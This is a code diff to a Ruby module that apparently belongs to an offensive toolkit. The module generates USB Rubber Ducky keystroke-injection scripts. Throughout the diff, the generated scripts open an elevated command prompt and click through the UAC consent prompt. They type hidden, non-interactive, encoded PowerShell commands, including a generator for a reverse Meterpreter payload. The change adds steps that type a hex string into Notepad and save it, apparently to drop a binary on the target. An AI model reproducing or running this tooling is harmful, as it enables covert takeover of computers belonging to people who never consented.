@@ -3,7 +3,8 @@ require_relative 'core'
 include MainCommands
 module DuckySetUp
   def admin_with_uac
-    "DELAY 2000\nGUI r\nDELAY 500\nSTRING powershell Start-Process cmd -Verb runAs\nENTER\nDELAY 3000\nALT y\nDELAY 500"
+    "DELAY 2000\nCTRL ESC\nDELAY 200\nSTRING cmd\nCTRL-SHIFT ENTER\nDELAY 2000\nALT y\nDELAY 500"
+    #"DELAY 2000\nGUI r\nDELAY 500\nSTRING powershell Start-Process cmd -Verb runAs\nENTER\nDELAY 3000\nALT y\nDELAY 500"
   end
   def admin_with_out_uac
     "DELAY 2000\nGUI r\nDELAY 500\nSTRING powershell Start-Process cmd -Verb runAs\nENTER\nDELAY 500"
@@ -12,7 +13,10 @@ module DuckySetUp
     "DELAY 2000\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 500"
   end
   def notepad_hex
-    "DELAY 2000\nGUI r\nDELAY 500\nSTRING notepad\nENTER\nDELAY 500"
+    "DELAY 2000\nGUI r\nDELAY 500\nSTRING notepad.exe\nENTER\nDELAY 500"
+  end
+  def save_notepad
+    "CTRL s\n#{temp_path}\nEnter\n"
   end
   def ducky_meterpreter_low(encoded_command)
     File.open("#{text_path}#{reverse_meterpreter_file}",'w') {|f| f.write("#{low_priv}\nSTRING powershell -nop -wind hidden -noni -enc #{encoded_command}\nENTER")}
@@ -44,14 +48,14 @@ module DuckySetUp
   def ducky_wget_low(encoded_command)
     File.open("#{text_path}#{wget_file}", 'w') {|f| f.write("#{low_priv}\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER")}
   end
-  def ducky_hex_uac(encoded_command)
-    File.open("#{text_path}#{hex_to_bin_file}", 'w') {|f| f.write("#{admin_with_uac}\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER")}
+  def ducky_hex_uac(hex_string,encoded_command)
+    File.open("#{text_path}#{hex_to_bin_file}", 'w') {|f| f.write("#{notepad_hex}\n#{hex_string}\n#{save_notepad}\n#{admin_with_uac}\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER")}
   end
-  def ducky_hex_no_uac(encoded_command)
-    File.open("#{text_path}#{hex_to_bin_file}", 'w') {|f| f.write("#{admin_with_out_uac}\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER")}
+  def ducky_hex_no_uac(hex_string,encoded_command)
+    File.open("#{text_path}#{hex_to_bin_file}", 'w') {|f| f.write("#{notepad_hex}\n#{hex_string}\n#{save_notepad}\n#{admin_with_out_uac}\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER")}
   end
-  def ducky_hex_low(encoded_command)
-    File.open("#{text_path}#{hex_to_bin_file}", 'w') {|f| f.write("#{notepad_hex}\n#{low_priv}\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER")}
+  def ducky_hex_low(hex_string,encoded_command)
+    File.open("#{text_path}#{hex_to_bin_file}", 'w') {|f| f.write("#{notepad_hex}\n#{hex_string}\n#{save_notepad}\n#{low_priv}\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER")}
   end
   def language_select
     languages = { :'1' => 'us.properties', :'2' => 'be.properties', :'3' => 'it.properties', :'4' => 'dk.properties', :'5' => 'es.properties', :'6' => 'uk.properties', :'7' => 'sv.properties' ,
